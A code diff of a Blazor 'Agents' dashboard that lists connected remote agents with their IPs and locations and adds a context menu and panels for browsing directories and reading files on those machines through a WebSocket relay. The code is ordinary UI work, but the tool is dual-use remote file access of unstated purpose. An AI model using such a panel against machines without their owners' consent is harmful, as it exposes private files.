@@ -3,6 +3,7 @@
 @using System.Net.WebSockets
 @using System.Text
 @using System.Text.Json
+@using cc.Components
 @implements IAsyncDisposable
 
 <PageTitle>Agents</PageTitle>
@@ -11,7 +12,10 @@
 
 @if (error is not null)
 {
-    <div class="alert alert-danger">@error</div>
+    <div class="alert alert-danger alert-dismissible">
+        @error
+        <button type="button" class="btn-close" @onclick="() => error = null"></button>
+    </div>
 }
 else if (agents is null)
 {
@@ -52,7 +56,7 @@ else
     else
     {
         <div class="table-responsive">
-            <table class="table table-striped">
+            <table class="table table-striped mb-0">
                 <thead>
                     <tr>
                         <th>ID</th>
@@ -68,7 +72,10 @@ else
                 <tbody>
                     @foreach (var agent in agents.Connections)
                     {
-                        <tr>
+                        <tr class="@(relayedAgentId == agent.Id ? "table-active" : "")"
+                            style="cursor:context-menu"
+                            @oncontextmenu="(e) => ShowContextMenu(e, agent.Id)"
+                            @oncontextmenu:preventDefault="true">
                             <td><code>@agent.Id</code></td>
                             <td><code>@agent.Ip</code></td>
                             <td>@FormatLocation(agent)</td>
@@ -90,12 +97,67 @@ else
                                 {
                                     <button class="btn btn-outline-danger btn-sm" @onclick="DisconnectRelay">Disconnect</button>
                                 }
+                                else if (agent.Relayed)
+                                {
+                                    <span class="badge bg-warning text-dark">In Use</span>
+                                }
                                 else if (relayedAgentId is null)
                                 {
                                     <button class="btn btn-outline-primary btn-sm" @onclick="() => ConnectToAgent(agent.Id)">Connect</button>
                                 }
                             </td>
                         </tr>
+
+                        @* Expanded panel below connected agent *@
+                        @if (relayedAgentId == agent.Id && expandedPanel is not null)
+                        {
+                            <tr>
+                                <td colspan="8" class="p-0 border-0">
+                                    <div class="bg-body-secondary p-3">
+                                        <div class="d-flex align-items-center justify-content-between mb-3">
+                                            <h6 class="mb-0">@expandedPanel</h6>
+                                            <button class="btn btn-outline-secondary btn-sm py-0" @onclick="() => expandedPanel = null">Close</button>
+                                        </div>
+
+                                        @if (expandedPanel == "File Manager")
+                                        {
+                                            <FileManager @ref="fileManagerRef" RelayWs="relayWs" />
+                                        }
+                                        else if (expandedPanel == "Commands")
+                                        {
+                                            <div>
+                                                <div class="mb-3">
+                                                    <button class="btn btn-outline-primary btn-sm me-2" @onclick="SendGetUUID" disabled="@sending">GetUUID</button>
+                                                </div>
+
+                                                <div class="mb-3">
+                                                    <label class="form-label">Path</label>
+                                                    <input class="form-control form-control-sm" @bind="commandPath" placeholder="C:\" />
+                                                </div>
+
+                                                <div class="d-flex gap-2 flex-wrap mb-3">
+                                                    <button class="btn btn-outline-primary btn-sm" @onclick="SendGetDirectoryContent" disabled="@sending">GetDirectoryContent</button>
+
+                                                    <div class="d-flex align-items-center gap-2">
+                                                        <button class="btn btn-outline-primary btn-sm" @onclick="SendGetFileContent" disabled="@sending">GetFileContent</button>
+                                                        <input class="form-control form-control-sm" style="width:100px" @bind="readCount" placeholder="Size" type="number" />
+                                                        <input class="form-control form-control-sm" style="width:100px" @bind="fileOffset" placeholder="Offset" type="number" />
+                                                    </div>
+
+                                                    <div class="d-flex align-items-center gap-2">
+                                                        <button class="btn btn-outline-primary btn-sm" @onclick="SendGetFileChunkHash" disabled="@sending">GetFileChunkHash</button>
+                                                        <input class="form-control form-control-sm" style="width:100px" @bind="chunkSize" placeholder="Chunk" type="number" />
+                                                        <input class="form-control form-control-sm" style="width:100px" @bind="hashOffset" placeholder="Offset" type="number" />
+                                                    </div>
+                                                </div>
+
+                                                <pre class="bg-dark text-light p-3 rounded" style="max-height:300px;overflow-y:auto;white-space:pre-wrap;font-size:0.85rem;">@output</pre>
+                                            </div>
+                                        }
+                                    </div>
+                                </td>
+                            </tr>
+                        }
                     }
                 </tbody>
             </table>
@@ -103,44 +165,31 @@ else
     }
 }
 
-@if (relayedAgentId is not null)
+@* Context menu *@
+@if (ctxVisible)
 {
-    <div class="card mb-3">
-        <div class="card-body">
-            <h5 class="card-title">Commands — <code>@relayedAgentId</code></h5>
-
-            <div class="mb-3">
-                <button class="btn btn-outline-primary me-2" @onclick="SendGetUUID" disabled="@sending">GetUUID</button>
-            </div>
-
-            <div class="mb-3">
-                <label class="form-label">Path</label>
-                <input class="form-control" @bind="commandPath" placeholder="C:\" />
-            </div>
-
-            <div class="d-flex gap-2 flex-wrap">
-                <button class="btn btn-outline-primary" @onclick="SendGetDirectoryContent" disabled="@sending">GetDirectoryContent</button>
-
-                <div class="d-flex align-items-center gap-2">
-                    <button class="btn btn-outline-primary" @onclick="SendGetFileContent" disabled="@sending">GetFileContent</button>
-                    <input class="form-control" style="width:120px" @bind="readCount" placeholder="Size" type="number" />
-                    <input class="form-control" style="width:120px" @bind="fileOffset" placeholder="Offset" type="number" />
-                </div>
-
-                <div class="d-flex align-items-center gap-2">
-                    <button class="btn btn-outline-primary" @onclick="SendGetFileChunkHash" disabled="@sending">GetFileChunkHash</button>
-                    <input class="form-control" style="width:120px" @bind="chunkSize" placeholder="Chunk" type="number" />
-                    <input class="form-control" style="width:120px" @bind="hashOffset" placeholder="Offset" type="number" />
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <div class="card">
-        <div class="card-body">
-            <h5 class="card-title">Output</h5>
-            <pre class="bg-dark text-light p-3 rounded" style="max-height:400px;overflow-y:auto;white-space:pre-wrap;">@output</pre>
-        </div>
+    <div class="position-fixed top-0 start-0 w-100 h-100" style="z-index:1050;" @onclick="HideContextMenu" @oncontextmenu="HideContextMenu" @oncontextmenu:preventDefault="true"></div>
+    <div class="dropdown-menu show shadow" style="position:fixed;left:@(ctxX)px;top:@(ctxY)px;z-index:1051;">
+        @if (relayedAgentId == ctxAgentId)
+        {
+            <button class="dropdown-item" @onclick="OpenPanelFiles">File Manager</button>
+            <button class="dropdown-item" @onclick="OpenPanelCommands">Commands</button>
+            <div class="dropdown-divider"></div>
+            <button class="dropdown-item text-danger" @onclick="CtxDisconnect">Disconnect</button>
+        }
+        else if (IsCtxAgentRelayed())
+        {
+            <span class="dropdown-item-text text-muted small">Relay already in use</span>
+        }
+        else if (relayedAgentId is null)
+        {
+            <button class="dropdown-item" @onclick="CtxConnectFiles">Connect + Files</button>
+            <button class="dropdown-item" @onclick="CtxConnectCommands">Connect + Commands</button>
+        }
+        else
+        {
+            <span class="dropdown-item-text text-muted small">Already connected to another agent</span>
+        }
     </div>
 }
 
@@ -155,10 +204,12 @@ else
     private ClientWebSocket? eventsWs;
     private CancellationTokenSource? eventsCts;
 
-    // Relay command state
+    // Relay
     private ClientWebSocket? relayWs;
     private string? relayedAgentId;
     private bool sending;
+
+    // Raw commands
     private string commandPath = @"C:\";
     private long readCount = 4096;
     private long fileOffset;
@@ -166,14 +217,84 @@ else
     private long hashOffset;
     private string output = "";
 
+    // Expanded panel
+    private string? expandedPanel;
+    private FileManager? fileManagerRef;
+
+    // Context menu
+    private bool ctxVisible;
+    private double ctxX;
+    private double ctxY;
+    private string? ctxAgentId;
+
     protected override void OnInitialized()
     {
         _ = ConnectToEvents();
     }
 
-    private void DisconnectEvents()
+    // --- Context menu ---
+
+    private void ShowContextMenu(MouseEventArgs e, string agentId)
+    {
+        ctxX = e.ClientX;
+        ctxY = e.ClientY;
+        ctxAgentId = agentId;
+        ctxVisible = true;
+    }
+
+    private void HideContextMenu()
+    {
+        ctxVisible = false;
+    }
+
+    private bool IsCtxAgentRelayed()
+    {
+        return agents?.Connections.Any(a => a.Id == ctxAgentId && a.Relayed) == true;
+    }
+
+    private async Task CtxConnectFiles()
+    {
+        HideContextMenu();
+        if (ctxAgentId is not null)
+        {
+            await ConnectToAgent(ctxAgentId);
+            expandedPanel = "File Manager";
+        }
+    }
+
+    private async Task CtxConnectCommands()
+    {
+        HideContextMenu();
+        if (ctxAgentId is not null)
+        {
+            await ConnectToAgent(ctxAgentId);
+            expandedPanel = "Commands";
+        }
+    }
+
+    private async Task CtxDisconnect()
+    {
+        HideContextMenu();
+        await DisconnectRelay();
+    }
+
+    private void OpenPanel(string panel)
+    {
+        HideContextMenu();
+        expandedPanel = panel;
+    }
+
+    private void OpenPanelFiles() => OpenPanel("File Manager");
+    private void OpenPanelCommands() => OpenPanel("Commands");
+
+    // --- Events WebSocket ---
+
+    private async Task DisconnectEvents()
     {
         eventsCts?.Cancel();
+        agents = null;
+        if (relayedAgentId is not null)
+            await DisconnectRelay();
     }
 
     private void ReconnectEvents()
@@ -221,6 +342,9 @@ else
             catch
             {
                 eventsConnected = false;
+                agents = null;
+                if (relayedAgentId is not null)
+                    await DisconnectRelay();
                 await InvokeAsync(StateHasChanged);
             }
             finally
@@ -228,6 +352,9 @@ else
                 eventsWs?.Dispose();
                 eventsWs = null;
                 eventsConnected = false;
+                agents = null;
+                if (relayedAgentId is not null)
+                    await DisconnectRelay();
             }
 
             if (!token.IsCancellationRequested)
@@ -258,6 +385,12 @@ else
                     Count = agentArray.Length,
                     Connections = agentArray
                 };
+
+                if (relayedAgentId is not null && !agentArray.Any(a => a.Id == relayedAgentId))
+                {
+                    _ = DisconnectRelay();
+                }
+
                 error = null;
             }
             else
@@ -290,7 +423,7 @@ else
                     if (relayedAgentId == agent.Id)
                     {
                         _ = DisconnectRelay();
-                        output += "Agent disconnected.\n";
+                        error = "Agent disconnected.";
                     }
                 }
 
@@ -303,7 +436,7 @@ else
         }
     }
 
-    // --- Relay commands ---
+    // --- Relay connection ---
 
     private async Task ConnectToAgent(string agentId)
     {
@@ -314,6 +447,7 @@ else
             await relayWs.ConnectAsync(new Uri($"wss://relay.nostdlib.workers.dev/relay/{agentId}"), CancellationToken.None);
             relayedAgentId = agentId;
             output = "Connected. Ready to send commands.\n";
+            fileManagerRef?.Reset();
         }
         catch (Exception ex)
         {
@@ -332,8 +466,11 @@ else
             relayWs = null;
         }
         relayedAgentId = null;
+        expandedPanel = null;
         output = "";
     }
+
+    // --- Raw commands ---
 
     private async Task SendGetUUID()
     {
@@ -425,6 +562,8 @@ else
 
         output += $"SHA-256: {Convert.ToHexString(response.AsSpan(4, 32))}\n";
     }
+
+    // --- Shared helpers ---
 
     private byte[] BuildPathCommand(byte cmd, string path)
     {
